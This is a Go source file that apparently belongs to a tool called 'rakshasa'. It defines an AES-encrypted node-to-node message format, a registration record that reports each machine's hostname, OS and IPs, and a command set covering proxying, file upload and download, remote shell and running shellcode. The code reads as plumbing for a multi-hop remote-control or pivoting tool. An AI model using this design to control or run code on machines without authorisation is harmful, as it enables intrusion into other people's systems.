package common

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/google/uuid"
	"math/rand"
	"net"
	"rakshasa/aes"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var Debug bool = false
var DebugLock bool = false
var DebugLockMap sync.Map

const UUID_LEN = 16

var BroadcastUUID, _ = uuid.FromBytes(bytes.Repeat([]byte{0xff}, UUID_LEN))
var NoneUUID, _ = uuid.FromBytes(bytes.Repeat([]byte{0x00}, UUID_LEN))
var EnableTermVt bool

// 数据包结构 包长（2byte）UUID+UUID+MsgId+Ttl+cmd包
type Msg struct {
	From  string
	To    string
	MsgId uint32
	Ttl   uint8
	CmdOpteion uint8
	CmdId      uint32
	CmdData    []byte
}

const (
	MAX_PLAINTEXT     = 16384 - 2 - UUID_LEN*2 - 4 - 1 - 5 //不包含headlen
	MAX_PACKAGE       = 0xffff - UUID_LEN*2 - 4 - 1 - 5
	INIT_WINDOWS_SIZE = MAX_PLAINTEXT * 20
	WRITE_DEADLINE    = time.Second * 5
	CMD_TIMEOUT       = time.Second * 10
)

// 大数据包格式，(CMD+fd)headlen+内容，不超过MaxPlaintext,使用tls自动分包
const (
	CMD_NONE                    = iota
	CMD_CONNECT_BYIDADDR        //请求id,  格式newWork(1byte)+负载
	CMD_CONNECT_BYIDADDR_RESULT //返回id
	CMD_DELETE_CONNID           //删除fd资源
	CMD_CONN_MSG                //发送消息，格式windows(8byte)+负载
	CMD_CONN_UDP_MSG            //udp数据包

	CMD_NODE_RESTART   //删除所有
	CMD_WINDOWS_UPDATE // 增加窗口值
	CMD_PING           //请求ping
	CMD_PONG           //返回pong
	CMD_PING_LISTEN    //bind和remoteSocke5用,type(1byte)+id(4byte)
	CMD_PING_LISTEN_RESULT
	CMD_REG        //通过本地注册
	CMD_REG_RESULT //节点端注册
	CMD_REMOTE_REG //通过远程服务器注册
	CMD_REMOTE_REG_RESULT
	CMD_GET_CURRENT_NODE //特殊指令，节点丢失后，查询节点
	CMD_GET_CURRENT_NODE_RESULT
	CMD_GET_NODE //获取节点列表
	CMD_GET_NODE_RESULT
	CMD_ADD_NODE //新增节点
	CMD_LISTEN   //监听
	CMD_LISTEN_RESULT
	CMD_DELETE_LISTEN
	CMD_CONNECT_BYID //连接
	CMD_DELETE_LISTENCONN_BYID
	CMD_REMOTE_SOCKS5 //
	//CMD_REMOTE_SOCKS5_RESULT
	CMD_PWD
	CMD_PWD_RESULT
	CMD_DIR
	CMD_DIR_RESULT
	CMD_CD
	CMD_CD_RESULT
	CMD_UPLOAD
	CMD_UPLOAD_RESULT //type(1byte)+msg  type定义 0=错误,1=进度
	CMD_DOWNLOAD
	CMD_DOWNLOAD_RESULT //type(1byte)+msg  type定义 0=错误,1=size包,2=数据包
	CMD_SHELL
	CMD_SHELL_DATA
	CMD_SHELL_RESULT
	CMD_RUN_SHELLCODE
	CMD_RUN_SHELLCODE_RESULT
)

var CmdToName = map[uint8]string{
	CMD_NONE:                    "CMD_NONE",
	CMD_CONNECT_BYIDADDR:        "CMD_CONNECT_BYIDADDR",
	CMD_CONNECT_BYIDADDR_RESULT: "CMD_CONNECT_BYIDADDR_RESULT",
	CMD_DELETE_CONNID:           "CMD_DELETE_CONNID",
	CMD_CONN_MSG:                "CMD_CONN_MSG",
	CMD_CONN_UDP_MSG:            "CMD_CONN_UDP_MSG",
	CMD_NODE_RESTART:            "CMD_NODE_RESTART",
	CMD_WINDOWS_UPDATE:          "CMD_WINDOWS_UPDATE",
	CMD_PING:                    "CMD_PING",
	CMD_PONG:                    "CMD_PONG",
	CMD_PING_LISTEN:             "CMD_PING_LISTEN",
	CMD_PING_LISTEN_RESULT:      "CMD_PING_LISTEN_RESULT",
	CMD_REG:                     "CMD_REG",
	CMD_REG_RESULT:              "CMD_REG_RESULT",
	CMD_REMOTE_REG:              "CMD_REMOTE_REG",
	CMD_REMOTE_REG_RESULT:       "CMD_REMOTE_REG_RESULT",
	CMD_GET_CURRENT_NODE:        "CMD_GET_CURRENT_NODE",
	CMD_GET_CURRENT_NODE_RESULT: "CMD_GET_CURRENT_NODE_RESULT",
	CMD_GET_NODE:                "CMD_GET_NODE",
	CMD_GET_NODE_RESULT:         "CMD_GET_NODE_RESULT",
	CMD_ADD_NODE:                "CMD_ADD_NODE",
	CMD_LISTEN:                  "CMD_LISTEN",
	CMD_LISTEN_RESULT:           "CMD_LISTEN_RESULT",
	CMD_DELETE_LISTEN:           "CMD_DELETE_LISTEN",
	CMD_CONNECT_BYID:            "CMD_CONNECT_BYID",
	CMD_DELETE_LISTENCONN_BYID:  "CMD_DELETE_LISTEN_CONN_BYID",
	CMD_REMOTE_SOCKS5:           "CMD_REMOTE_SOCKS5",
	//CMD_REMOTE_SOCKS5_RESULT:    "CMD_REMOTE_SOCKS5_RESULT",
	CMD_PWD:                  "CMD_PWD",
	CMD_PWD_RESULT:           "CMD_PWD_RESULT",
	CMD_DIR:                  "CMD_DIR",
	CMD_DIR_RESULT:           "CMD_DIR_RESULT",
	CMD_CD:                   "CMD_CD",
	CMD_CD_RESULT:            "CMD_CD_RESULT",
	CMD_UPLOAD:               "CMD_UPLOAD",
	CMD_UPLOAD_RESULT:        "CMD_UPLOAD_RESULT",
	CMD_DOWNLOAD:             "CMD_DOWNLOAD",
	CMD_DOWNLOAD_RESULT:      "CMD_DOWNLOAD_RESULT",
	CMD_SHELL:                "CMD_SHELL",
	CMD_SHELL_DATA:           "CMD_SHELL_DATA",
	CMD_SHELL_RESULT:         "CMD_SHELL_RESULT",
	CMD_RUN_SHELLCODE:        "CMD_RUN_SHELLCODE",
	CMD_RUN_SHELLCODE_RESULT: "CMD_RUN_SHELLCODE_RESULT",
}

type NetWork byte

const (
	_ NetWork = iota
	SOCKS5_CMD_CONNECT
	// CmdBind is bind command
	SOCKS5_CMD_BIND
	// CmdUDP is UDP command
	SOCKS5_CMD_UDP

	RAW_TCP

	RAW_TCP_WITH_PROXY
)

// 符合Server调用的接口
type Server interface {
	ID() uint32
	Write(buf []byte)
	DeleteFd(fd [2]byte)
	FdLoad(fd [2]byte) bool
	FdStore(fd [2]byte, c Conn)
	Close(string)
	AddrList() string
}

const (
	CONN_STATUS_OK = iota
	CONN_STATUS_CLOSE
)

// 符合Conn调用的接口
type Conn interface {
	Write([]byte) //会将部分消息原样不动发回去
	Close(string)
}
type Close interface {
	Close(string)
}

var globalID1, globalID2 uint32
var GetIDLock sync.Mutex

func GetID() uint32 {
	return atomic.AddUint32(&globalID1, 1)
}

func GetConnID() uint32 {
	return atomic.AddUint32(&globalID2, 1)
}
func init() {
	rand.Seed(time.Now().Unix())

}

type RegMsg struct {
	UUID     string //当前机器uuid
	Addr     string
	RegAddr  string //远程连接的addr
	Hostname string //当前机器名称
	Goos     string
	ViaUUID  string
	Err      string
	MainIp   []string
	Port     int
}

var msgId uint32

func (m *Msg) Marshal() []byte {
	l := UUID_LEN*2 + 4 + 1 + 5 + len(m.CmdData)
	data := make([]byte, l+2)
	data1 := make([]byte, l+2)
	data1[0] = byte(l)
	data1[1] = byte(l >> 8)
	uf, _ := uuid.Parse(m.From)
	ut, _ := uuid.Parse(m.To)
	bf, _ := uf.MarshalBinary()
	bt, _ := ut.MarshalBinary()
	copy(data[2:], bf)
	copy(data[2+UUID_LEN:], bt)
	b := 2 + 2*UUID_LEN
	if m.MsgId == 0 { //id不为0
		m.MsgId = atomic.AddUint32(&msgId, 1)
	}
	data[b] = byte(m.MsgId)
	data[b+1] = byte(m.MsgId >> 8)
	data[b+2] = byte(m.MsgId >> 16)
	data[b+3] = byte(m.MsgId >> 24)
	data[b+4] = m.Ttl
	data[b+5] = m.CmdOpteion
	data[b+6] = byte(m.CmdId)
	data[b+7] = byte(m.CmdId >> 8)
	data[b+8] = byte(m.CmdId >> 16)
	data[b+9] = byte(m.CmdId >> 24)
	copy(data[2+2*UUID_LEN+4+1+5:], m.CmdData)
	aes.AesCtrEncrypt(data1[2:], data[2:])
	return data1
}
func UnmarshalMsg(data []byte) (msg *Msg) {
	if len(data) < 2*UUID_LEN+4+1+5 {
		return
	}
	msg = &Msg{}
	uf, _ := uuid.FromBytes(data[:UUID_LEN])
	ut, _ := uuid.FromBytes(data[UUID_LEN : 2*UUID_LEN])
	msg.From = uf.String()
	msg.To = ut.String()
	b := 2 * UUID_LEN

	msg.MsgId = uint32(data[b]) | uint32(data[b+1])<<8 | uint32(data[b+2])<<16 | uint32(data[b+3])<<24
	msg.Ttl = data[b+4]

	msg.CmdOpteion = data[b+5]
	msg.CmdId = uint32(data[b+6]) | uint32(data[b+7])<<8 | uint32(data[b+8])<<16 | uint32(data[b+9])<<24
	msg.CmdData = data[b+10:]

	return
}
func ExternalIP() (net.IP, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return nil, err
		}
		for _, addr := range addrs {
			ip := getIpFromAddr(addr)
			if ip == nil {
				continue
			}
			return ip, nil
		}
	}
	return nil, errors.New("connected to the network?")
}

// 获取ip
func getIpFromAddr(addr net.Addr) net.IP {
	var ip net.IP
	switch v := addr.(type) {
	case *net.IPNet:
		ip = v.IP
	case *net.IPAddr:
		ip = v.IP
	}
	if ip == nil || ip.IsLoopback() {
		return nil
	}
	ip = ip.To4()
	if ip == nil {
		return nil // not an ipv4 address
	}

	return ip
}
func ResolveTCPAddr(str string) ([]string, error) {
	dst := strings.Split(str, ",")
	for i := len(dst) - 1; i >= 0; i-- {
		addr := dst[i]
		if addr == "" {
			dst = append(dst[:i], dst[i+1:]...)
		} else {
			if _, err := net.ResolveTCPAddr("tcp", addr); err != nil {
				return nil, fmt.Errorf("参数错误 格式为\"ip:端口\",多个地址以逗号隔开，错误详情%v", err)
			}
		}

	}

	return dst, nil
}
